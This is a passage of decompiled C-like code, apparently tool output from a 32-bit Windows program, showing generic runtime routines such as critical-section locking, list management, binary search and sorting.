    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_00411754(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_00411760(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_0041176c(int param_1,PVOID param_2)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *(int *)(*(int *)(param_1 + 4) + 8) + -1;
  if (-1 < iVar2) {
    do {
      piVar1 = (int *)FUN_00411aa4(*(undefined4 **)(param_1 + 4),iVar2);
      FUN_004115e0((int)piVar1,param_2);
      if (*(int *)(piVar1[3] + 8) == 0) {
        FUN_00403b24(piVar1);
        FUN_004119b4(*(int **)(param_1 + 4),iVar2);
      }
      iVar2 = iVar2 + -1;
    } while (iVar2 != -1);
  }
  return;
}



void FUN_004117bc(PVOID param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  
  puStack12 = (undefined *)0x4117cc;
  FUN_00411754(DAT_00442854);
  puStack16 = &DAT_004117fe;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  puStack12 = &stack0xfffffffc;
  FUN_0041176c(DAT_00442854,param_1);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_00411805;
  puStack16 = (undefined *)0x4117fd;
  FUN_00411760(DAT_00442854);
  return;
}



void FUN_00411860(int *param_1,char param_2,int param_3,int param_4,int param_5)

{
  int extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  undefined4 in_stack_fffffff8;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffec,in_stack_fffffff0,
                                  in_stack_fffffff4,in_stack_fffffff8);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  param_1[1] = param_3;
  param_1[2] = param_5;
  param_1[3] = param_4;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffec;
  }
  return;
}



void FUN_00411898(int param_1,int param_2,int param_3)

{
  int iVar1;
  
  iVar1 = FUN_00411860((int *)&LAB_00411854,'\x01',param_1,param_3,param_2);
  FUN_00411cc0(DAT_00442850,iVar1);
  return;
}



undefined4 FUN_004118c4(char *param_1,char **param_2,int param_3,int param_4)

{
  undefined4 uVar1;
  char **ppcVar2;
  int iVar3;
  
  if (-1 < param_4) {
    iVar3 = param_4 + 1;
    ppcVar2 = (char **)(param_3 + 4);
    do {
      uVar1 = FUN_00407ec0(*ppcVar2,param_1);
      if ((char)uVar1 != '\0') {
        *param_2 = ppcVar2[-1];
        return CONCAT31((int3)((uint)uVar1 >> 8),1);
      }
      ppcVar2 = ppcVar2 + 2;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
  }
  return 0;
}



uint FUN_00411904(uint param_1,int *param_2,uint *param_3,int param_4)

{
  int iVar1;
  byte local_9;
  
  if (-1 < param_4) {
    iVar1 = param_4 + 1;
    do {
      if (param_1 == *param_3) {
        local_9 = 1;
        param_1 = FUN_004047fc(param_2,(undefined4 *)param_3[1]);
        goto LAB_0041193b;
      }
      param_3 = param_3 + 2;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_9 = 0;
LAB_0041193b:
  return param_1 & 0xffffff00 | (uint)local_9;
}



void FUN_00411948(int *param_1,char param_2)

{
  int *piVar1;
  char extraout_DL;
  
  piVar1 = FUN_00403e08(param_1,param_2);
  (**(code **)(*piVar1 + 8))();
  if ('\0' < extraout_DL) {
    FUN_00403df0(piVar1);
  }
  return;
}



int FUN_00411968(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1[2];
  if (iVar1 == param_1[3]) {
    (**(code **)*param_1)();
  }
  *(int *)(param_1[1] + iVar1 * 4) = param_2;
  param_1[2] = param_1[2] + 1;
  if (param_2 != 0) {
    (**(code **)(*param_1 + 4))(param_1,param_2,0);
  }
  return iVar1;
}



void FUN_0041199c(int *param_1)

{
  FUN_00411b7c(param_1,0);
  FUN_00411b40(param_1,0);
  return;
}



void FUN_004119b4(int *param_1,int param_2)

{
  int iVar1;
  
  if ((param_2 < 0) || (param_1[2] <= param_2)) {
    FUN_00411a50(*param_1,(int **)PTR_PTR_DAT_0044153c,param_2);
  }
  iVar1 = FUN_00411aa4(param_1,param_2);
  param_1[2] = param_1[2] + -1;
  if (param_2 < param_1[2]) {
    FUN_0040285c((undefined4 *)(param_1[1] + 4 + param_2 * 4),
                 (undefined4 *)(param_1[1] + param_2 * 4),(param_1[2] - param_2) * 4);
  }
  if (iVar1 != 0) {
    (**(code **)(*param_1 + 4))(param_1,iVar1,2);
  }
  return;
}



undefined4 FUN_00411a14(void)

{
  int unaff_EBP;
  
  return *(undefined4 *)(unaff_EBP + 4);
}



void FUN_00411a18(undefined4 param_1,byte *param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 local_10;
  undefined local_c;
  
  FUN_00411a14();
  local_c = 0;
  local_10 = param_3;
  iVar1 = FUN_0040b8f8((int)&DAT_00410b34,'\x01',param_2,0,&local_10);
  FUN_00404208(iVar1);
  return;
}



void FUN_00411a50(undefined4 param_1,int **param_2,undefined4 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  byte *local_8;
  
  puStack20 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack24 = &LAB_00411a98;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  FUN_0040658c(param_2,(int *)&local_8);
  FUN_00411a18(&LAB_00410ca8,local_8,param_3);
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_00411a9f;
  puStack24 = (undefined *)0x411a97;
  FUN_004047a8((int *)&local_8);
  return;
}



undefined4 FUN_00411aa4(undefined4 *param_1,int param_2)

{
  if ((param_2 < 0) || ((int)param_1[2] <= param_2)) {
    FUN_00411a50(*param_1,(int **)PTR_PTR_DAT_0044153c,param_2);
  }
  return *(undefined4 *)(param_1[1] + param_2 * 4);
}



int FUN_00411b00(int param_1,int param_2)

{
  int iVar1;
  
  for (iVar1 = 0;
      (iVar1 < *(int *)(param_1 + 8) && (param_2 != *(int *)(*(int *)(param_1 + 4) + iVar1 * 4)));
      iVar1 = iVar1 + 1) {
  }
  if (iVar1 == *(int *)(param_1 + 8)) {
    iVar1 = -1;
  }
  return iVar1;
}



int FUN_00411b20(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = FUN_00411b00((int)param_1,param_2);
  if (-1 < iVar1) {
    FUN_004119b4(param_1,iVar1);
  }
  return iVar1;
}



void FUN_00411b40(undefined4 *param_1,int param_2)

{
  if ((param_2 < (int)param_1[2]) || (0x7ffffff < param_2)) {
    FUN_00411a50(*param_1,(int **)PTR_PTR_DAT_004414bc,param_2);
  }
  if (param_2 != param_1[3]) {
    FUN_004026e8(param_1 + 1,param_2 << 2);
    param_1[3] = param_2;
  }
  return;
}



void FUN_00411b7c(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  if ((param_2 < 0) || (0x7ffffff < param_2)) {
    FUN_00411a50(*param_1,(int **)PTR_PTR_DAT_00441470,param_2);
  }
  if (param_1[3] < param_2) {
    FUN_00411b40(param_1,param_2);
  }
  iVar1 = param_1[2];
  if (iVar1 < param_2) {
    FUN_004030a0((undefined4 *)(param_1[1] + iVar1 * 4),(param_2 - iVar1) * 4,0);
  }
  else {
    iVar1 = iVar1 + -1;
    if (param_2 - iVar1 == 0 || param_2 < iVar1) {
      iVar2 = (param_2 - iVar1) + -1;
      do {
        FUN_004119b4(param_1,iVar1);
        iVar1 = iVar1 + -1;
        iVar2 = iVar2 + 1;
      } while (iVar2 != 0);
    }
  }
  param_1[2] = param_2;
  return;
}



int * FUN_00411bf0(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 2));
  iVar1 = FUN_00403af4((int *)&LAB_00410ca8,'\x01',extraout_ECX_00);
  param_1[1] = iVar1;
  *(undefined *)(param_1 + 8) = 0;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_00411cc0(int param_1,int param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  
  puStack16 = (undefined *)0x411cd2;
  FUN_00411d48(param_1);
  puStack20 = &LAB_00411d3c;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  puStack16 = &stack0xfffffffc;
  if (*(char *)(param_1 + 0x20) != '\x01') {
    puStack16 = &stack0xfffffffc;
    iVar1 = FUN_00411b00(*(int *)(param_1 + 4),param_2);
    if (iVar1 != -1) {
      if (*(char *)(param_1 + 0x20) == '\x02') {
        FUN_00411a50(**(undefined4 **)(param_1 + 4),(int **)PTR_PTR_DAT_00441458,param_2);
      }
      goto LAB_00411d26;
    }
  }
  FUN_00411968(*(int **)(param_1 + 4),param_2);
LAB_00411d26:
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_00411d43;
  puStack20 = (undefined *)0x411d3b;
  FUN_00411dac(param_1);
  return;
}



undefined4 FUN_00411d48(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return *(undefined4 *)(param_1 + 4);
}



void FUN_00411d5c(int param_1,int param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  
  puStack16 = (undefined *)0x411d6e;
  FUN_00411d48(param_1);
  puStack20 = &LAB_00411d9f;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  puStack16 = &stack0xfffffffc;
  FUN_00411b20(*(int **)(param_1 + 4),param_2);
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_00411da6;
  puStack20 = (undefined *)0x411d9e;
  FUN_00411dac(param_1);
  return;
}



void FUN_00411dac(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_00411db8(int *param_1,char param_2)

{
  int *piVar1;
  byte extraout_DL;
  
  piVar1 = FUN_00403e08(param_1,param_2);
  FUN_00413e70((int)piVar1);
  FUN_00403b14(piVar1,extraout_DL & 0xfc);
  if ('\0' < (char)extraout_DL) {
    FUN_00403df0(piVar1);
  }
  return;
}



void FUN_00411de4(int *param_1,undefined4 *param_2)

{
  if (param_2 != (undefined4 *)0x0) {
    (**(code **)*param_2)(param_2,param_1);
    return;
  }
  FUN_00411df8(param_1,(int *)0x0);
  return;
}



void FUN_00411df8(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  undefined *puStack300;
  undefined *puStack296;
  undefined *puStack292;
  int local_118;
  undefined local_114;
  byte *local_110;
  undefined local_10c;
  byte local_108 [256];
  int local_8;
  
  puStack292 = &stack0xfffffffc;
  local_8 = 0;
  puStack296 = &LAB_00411eae;
  puStack300 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack300;
  if (param_2 == (int *)0x0) {
    FUN_00404840(&local_8,(int)&LAB_00411ec4);
  }
  else {
    puStack292 = &stack0xfffffffc;
    FUN_00403a9c(*param_2,local_108);
    FUN_00404a0c(&local_8,local_108);
  }
  local_118 = local_8;
  local_114 = 0xb;
  FUN_00403a9c(*param_1,local_108);
  local_110 = local_108;
  local_10c = 4;
  uVar2 = 1;
  iVar1 = FUN_0040b9b4((int)&DAT_00407810,'\x01',(int **)PTR_PTR_DAT_00441478,1,&local_118);
  FUN_00404208(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack300 = &LAB_00411eb5;
  FUN_004047a8(&local_8);
  return;
}



void FUN_00411f88(int *param_1)

{
  int iVar1;
  int *piVar2;
  int **ppiVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  
  FUN_00403d70();
  iVar1 = FUN_00403d20(param_1,extraout_EDX,extraout_ECX);
  if (iVar1 != 0) {
    piVar2 = (int *)FUN_00403d20(param_1,extraout_EDX_00,extraout_ECX_00);
    ppiVar3 = FUN_004060f8((int **)(param_1 + 1));
    FUN_00403bd8(piVar2,(int *)&DAT_00411fc8,ppiVar3);
  }
  return;
}



void FUN_00412040(int *param_1,char param_2)

{
  int *piVar1;
  byte extraout_DL;
  
  piVar1 = FUN_00403e08(param_1,param_2);
  FUN_00412b98((int)piVar1,(int **)0x0);
  FUN_00411db8(piVar1,extraout_DL & 0xfc);
  if ('\0' < (char)extraout_DL) {
    FUN_00403df0(piVar1);
  }
  return;
}



undefined4 FUN_00412094(int *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*param_1 + 0x38))();
  (**(code **)(*param_1 + 0x24))(param_1,uVar1,param_3);
  return uVar1;
}



void FUN_00412208(int *param_1)

{
  if (param_1[2] == 0) {
    (**(code **)(*param_1 + 0x30))(param_1,1);
  }
  param_1[2] = param_1[2] + 1;
  return;
}



byte FUN_00412220(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int *piVar1;
  byte bVar2;
  undefined4 uVar3;
  int iVar4;
  
  piVar1 = *(int **)(*(int *)(param_4 + -4) + 0x20);
  if (piVar1 == (int *)0x0) {
    iVar4 = (**(code **)(**(int **)(param_4 + -8) + 0x14))();
    bVar2 = 0 < iVar4;
  }
  else {
    bVar2 = 1;
    uVar3 = FUN_00403cb0(piVar1,(int)&PTR_LAB_00411ec5_3_00410f40);
    if ((char)uVar3 != '\0') {
      bVar2 = FUN_004122d8(*(int **)(param_4 + -8),piVar1);
      bVar2 = bVar2 ^ 1;
    }
  }
  return bVar2;
}



void FUN_004122c4(int *param_1)

{
  param_1[2] = param_1[2] + -1;
  if (param_1[2] == 0) {
    (**(code **)(*param_1 + 0x30))(param_1,0);
  }
  return;
}



void FUN_004122d8(int *param_1,int *param_2)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined uVar4;
  undefined4 uStack48;
  undefined *puStack44;
  undefined *puStack40;
  uint *local_18;
  uint *local_14;
  undefined local_d;
  int *local_c;
  int *local_8;
  
  puStack40 = &stack0xfffffffc;
  local_14 = (uint *)0x0;
  local_18 = (uint *)0x0;
  puStack44 = &LAB_0041236d;
  uStack48 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack48;
  local_d = 0;
  local_c = param_2;
  local_8 = param_1;
  iVar2 = (**(code **)(*param_1 + 0x14))();
  iVar3 = (**(code **)(*local_c + 0x14))();
  if (iVar2 == iVar3) {
    if (-1 < iVar2 + -1) {
      iVar3 = 0;
      uVar4 = true;
      do {
        (**(code **)(*local_8 + 0xc))(local_8,iVar3,&local_14);
        puVar1 = local_14;
        (**(code **)(*local_c + 0xc))(local_c,iVar3,&local_18);
        FUN_00404bb4(puVar1,local_18);
        if (!(bool)uVar4) goto LAB_00412352;
        iVar3 = iVar3 + 1;
        iVar2 = iVar2 + -1;
        uVar4 = iVar2 == 0;
      } while (!(bool)uVar4);
    }
    local_d = 1;
  }
LAB_00412352:
  *in_FS_OFFSET = uStack48;
  puStack40 = &LAB_00412374;
  puStack44 = (undefined *)0x41236c;
  FUN_004047cc((int *)&local_18,2);
  return;
}



undefined4 FUN_00412380(void)

{
  int unaff_EBP;
  
  return *(undefined4 *)(unaff_EBP + 4);
}



void FUN_00412384(undefined4 param_1,byte *param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 local_10;
  undefined local_c;
  
  FUN_00412380();
  local_c = 0;
  local_10 = param_3;
  iVar1 = FUN_0040b8f8((int)&DAT_00410b8c,'\x01',param_2,0,&local_10);
  FUN_00404208(iVar1);
  return;
}



void FUN_004123bc(undefined4 param_1,int **param_2,undefined4 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  byte *local_8;
  
  puStack24 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack28 = &LAB_00412404;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  FUN_0040658c(param_2,(int *)&local_8);
  FUN_00412384(param_1,local_8,param_3);
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_0041240b;
  puStack28 = (undefined *)0x412403;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00412508(int *param_1)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  undefined *local_8;
  
  puStack16 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  puStack20 = &LAB_0041254d;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  (**(code **)(*param_1 + 0x1c))(param_1,&local_8);
  puVar1 = (undefined4 *)FUN_00404c68(local_8);
  FUN_00408b10(puVar1);
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_00412554;
  puStack20 = (undefined *)0x41254c;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00412684(int *param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  int local_10;
  int local_c;
  undefined4 local_8;
  
  puStack32 = &stack0xfffffffc;
  local_10 = 0;
  puStack36 = &DAT_004126fc;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  local_8 = param_2;
  iVar1 = (**(code **)(*param_1 + 0x14))();
  if (-1 < iVar1 + -1) {
    local_c = 0;
    do {
      (**(code **)(*param_1 + 0xc))(param_1,local_c,&local_10);
      iVar2 = (**(code **)(*param_1 + 0x34))(param_1,local_10,local_8);
      if (iVar2 == 0) goto LAB_004126e6;
      local_c = local_c + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_c = -1;
LAB_004126e6:
  *in_FS_OFFSET = uStack40;
  puStack32 = &LAB_00412703;
  puStack36 = (undefined *)0x4126fb;
  FUN_004047a8(&local_10);
  return;
}



int FUN_004127e4(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar1 = (**(code **)(*param_1 + 0x14))();
  if (-1 < iVar1 + -1) {
    iVar3 = 0;
    do {
      iVar2 = (**(code **)(*param_1 + 0x18))(param_1,iVar3);
      if (param_2 == iVar2) {
        return iVar3;
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  return -1;
}



void FUN_00412818(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  (**(code **)(*param_1 + 0x60))(param_1,param_2,param_3);
  (**(code **)(*param_1 + 0x24))(param_1,param_2,param_4);
  return;
}



void FUN_0041289c(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack44;
  undefined *puStack40;
  undefined *puStack36;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  int local_c;
  int *local_8;
  
  puStack24 = &stack0xfffffffc;
  local_c = 0;
  puStack28 = &LAB_00412939;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  puStack36 = (undefined *)0x4128c4;
  local_8 = param_1;
  FUN_00412208(param_1);
  puStack40 = &LAB_0041291c;
  uStack44 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack44;
  puStack36 = &stack0xfffffffc;
  iVar1 = (**(code **)*param_2)();
  iVar2 = FUN_004133d8(param_2);
  FUN_00404898(&local_c,(undefined4 *)0x0,iVar1 - iVar2);
  (**(code **)(*param_2 + 0xc))(param_2,local_c,iVar1 - iVar2);
  (**(code **)(*local_8 + 0x2c))(local_8,local_c);
  *in_FS_OFFSET = uStack44;
  puStack36 = &LAB_00412923;
  puStack40 = (undefined *)0x41291b;
  FUN_004122c4(local_8);
  return;
}



void FUN_004129f8(int *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*param_1 + 0x18))(param_1,param_2);
  (**(code **)(*param_1 + 0x48))(param_1,param_2);
  (**(code **)(*param_1 + 100))(param_1,param_2,param_3,uVar1);
  return;
}



void FUN_00412ae0(int *param_1,undefined *param_2)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY24;
  undefined *puStackY20;
  
  puStackY20 = (undefined *)0x412afa;
  piVar1 = FUN_0041382c((int *)&PTR_LAB_00411270,'\x01',param_2,0xffff);
  puStackY20 = &LAB_00412b2b;
  uStackY24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY24;
  (**(code **)(*param_1 + 0x78))(param_1,piVar1);
  *in_FS_OFFSET = uStackY24;
  puStackY20 = (undefined *)0x412b2a;
  FUN_00403b24(piVar1);
  return;
}



void FUN_00412b98(int param_1,int **param_2)

{
  if (*(int *)(param_1 + 0xc) != 0) {
    (**(code **)(**(int **)(param_1 + 0xc) + 0x10))();
  }
  FUN_00406110((int **)(param_1 + 0xc),param_2);
  if (*(int *)(param_1 + 0xc) != 0) {
    (**(code **)(**(int **)(param_1 + 0xc) + 0xc))(*(int **)(param_1 + 0xc),param_1);
  }
  return;
}



void FUN_00412c1c(int *param_1,undefined4 *param_2)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  int local_c;
  int *local_8;
  
  puStack20 = &stack0xfffffffc;
  local_c = 0;
  puStack24 = &LAB_00412cd0;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  puStack32 = (undefined *)0x412c43;
  local_8 = param_1;
  FUN_00412208(param_1);
  puStack36 = &LAB_00412cb3;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  puStack32 = &stack0xfffffffc;
  (**(code **)(*local_8 + 0x44))();
  if (param_2 != (undefined4 *)0x0) {
    while (puVar2 = param_2, *(char *)param_2 != '\0') {
      for (; ((cVar1 = *(char *)puVar2, cVar1 != '\0' && (cVar1 != '\n')) && (cVar1 != '\r'));
          puVar2 = (undefined4 *)((int)puVar2 + 1)) {
      }
      FUN_00404898(&local_c,param_2,(int)puVar2 - (int)param_2);
      (**(code **)(*local_8 + 0x38))(local_8,local_c);
      param_2 = puVar2;
      if (*(char *)puVar2 == '\r') {
        param_2 = (undefined4 *)((int)puVar2 + 1);
      }
      if (*(char *)param_2 == '\n') {
        param_2 = (undefined4 *)((int)param_2 + 1);
      }
    }
  }
  *in_FS_OFFSET = uStack40;
  puStack32 = &LAB_00412cba;
  puStack36 = (undefined *)0x412cb2;
  FUN_004122c4(local_8);
  return;
}



uint FUN_00412d70(uint param_1)

{
  uint uVar1;
  
  uVar1 = param_1;
  if ((*(byte *)(param_1 + 4) & 4) == 0) {
    uVar1 = FUN_00412d88(param_1,'=');
  }
  return uVar1 & 0xffffff00 | (uint)*(byte *)(param_1 + 7);
}



void FUN_00412d88(int param_1,char param_2)

{
  if ((param_2 != *(char *)(param_1 + 7)) || ((*(byte *)(param_1 + 4) & 4) == 0)) {
    *(byte *)(param_1 + 4) = *(byte *)(param_1 + 4) | 4;
    *(char *)(param_1 + 7) = param_2;
  }
  return;
}



void FUN_00412fb0(int param_1,int param_2,int param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  puVar1 = (undefined4 *)(*(int *)(param_1 + 0x10) + param_2 * 8);
  puVar2 = (undefined4 *)(*(int *)(param_1 + 0x10) + param_3 * 8);
  uVar3 = *puVar1;
  *puVar1 = *puVar2;
  *puVar2 = uVar3;
  uVar3 = puVar1[1];
  puVar1[1] = puVar2[1];
  puVar2[1] = uVar3;
  return;
}



uint FUN_00412fd4(int *param_1,undefined4 param_2,uint *param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  byte local_18;
  int local_14;
  
  local_18 = 0;
  uVar3 = 0;
  local_14 = param_1[5] + -1;
  if (-1 < local_14) {
    do {
      uVar2 = local_14 + uVar3 >> 1;
      iVar1 = (**(code **)(*param_1 + 0x34))
                        (param_1,*(undefined4 *)(param_1[4] + uVar2 * 8),param_2);
      if (iVar1 < 0) {
        uVar3 = uVar2 + 1;
      }
      else {
        local_14 = uVar2 - 1;
        if ((iVar1 == 0) && (local_18 = 1, *(char *)((int)param_1 + 0x1d) != '\x01')) {
          uVar3 = uVar2;
        }
      }
    } while ((int)uVar3 <= local_14);
  }
  *param_3 = uVar3;
  return (uint)param_3 & 0xffffff00 | (uint)local_18;
}



void FUN_004130b0(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_1[6];
  if (iVar1 < 0x41) {
    if (iVar1 < 9) {
      iVar2 = 4;
    }
    else {
      iVar2 = 0x10;
    }
  }
  else {
    iVar2 = iVar1;
    if (iVar1 < 0) {
      iVar2 = iVar1 + 3;
    }
    iVar2 = iVar2 >> 2;
  }
  (**(code **)(*param_1 + 0x28))(param_1,iVar2 + iVar1);
  return;
}



void FUN_00413120(int *param_1)

{
  (**(code **)(*param_1 + 100))();
  return;
}



void FUN_00413130(int *param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  if (*(char *)(param_1 + 7) != '\0') {
    FUN_004123bc(param_1,(int **)PTR_PTR_DAT_0044146c,0);
  }
  if ((param_2 < 0) || (param_1[5] < param_2)) {
    FUN_004123bc(param_1,(int **)PTR_PTR_DAT_0044153c,param_2);
  }
  (**(code **)(*param_1 + 0x88))(param_1,param_2,param_3,param_4);
  return;
}



void FUN_004131fc(int *param_1,int param_2,undefined4 *param_3)

{
  if (*(char *)(param_1 + 7) != '\0') {
    FUN_004123bc(param_1,(int **)PTR_PTR_DAT_0044146c,0);
  }
  if ((param_2 < 0) || (param_1[5] <= param_2)) {
    FUN_004123bc(param_1,(int **)PTR_PTR_DAT_0044153c,param_2);
  }
  (**(code **)(*param_1 + 0x84))();
  FUN_004047fc((int *)(param_1[4] + param_2 * 8),param_3);
  (**(code **)(*param_1 + 0x80))();
  return;
}



void FUN_00413258(int *param_1,int param_2,undefined4 param_3)

{
  if ((param_2 < 0) || (param_1[5] <= param_2)) {
    FUN_004123bc(param_1,(int **)PTR_PTR_DAT_0044153c,param_2);
  }
  (**(code **)(*param_1 + 0x84))();
  *(undefined4 *)(param_1[4] + 4 + param_2 * 8) = param_3;
  (**(code **)(*param_1 + 0x80))();
  return;
}



void FUN_00413298(int param_1,uint param_2,uint param_3,undefined *param_4)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint local_14;
  uint local_c;
  
  local_c = param_2;
  do {
    local_14 = local_c + param_3 >> 1;
    uVar3 = local_c;
    uVar4 = param_3;
    do {
      while (iVar2 = (*(code *)param_4)(param_1,uVar3,local_14), iVar2 < 0) {
        uVar3 = uVar3 + 1;
      }
      while (iVar2 = (*(code *)param_4)(param_1,uVar4,local_14), 0 < iVar2) {
        uVar4 = uVar4 - 1;
      }
      if ((int)uVar3 <= (int)uVar4) {
        FUN_00412fb0(param_1,uVar3,uVar4);
        uVar1 = uVar4;
        if ((uVar3 != local_14) && (uVar1 = local_14, uVar4 == local_14)) {
          uVar1 = uVar3;
        }
        local_14 = uVar1;
        uVar3 = uVar3 + 1;
        uVar4 = uVar4 - 1;
      }
    } while ((int)uVar3 <= (int)uVar4);
    if ((int)local_c < (int)uVar4) {
      FUN_00413298(param_1,local_c,uVar4,param_4);
    }
    local_c = uVar3;
  } while ((int)uVar3 < (int)param_3);
  return;
}



undefined4 FUN_004133d8(int *param_1)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*param_1 + 0x18))(param_1,1,*param_1,0,0);
  return uVar1;
}



void FUN_004133f8(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  (**(code **)(*param_1 + 0x18))(param_1,0,*param_1,param_4,param_5);
  return;
}



void FUN_0041345c(int *param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5)

{
  (**(code **)(*param_1 + 8))();
  return;
}



void FUN_004134c4(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int iVar1;
  byte local_10c [256];
  byte *local_c;
  undefined local_8;
  
  FUN_00403a9c(**(int **)(param_4 + -4),local_10c);
  local_c = local_10c;
  local_8 = 4;
  iVar1 = FUN_0040b9b4((int)&DAT_00410860,'\x01',(int **)PTR_PTR_DAT_00441590,0,&local_c);
  FUN_00404208(iVar1);
  return;
}



void FUN_00413604(int *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  
  if (param_3 != 0) {
    iVar1 = (**(code **)(*param_1 + 0xc))(param_1,param_2,param_3);
    if (param_3 != iVar1) {
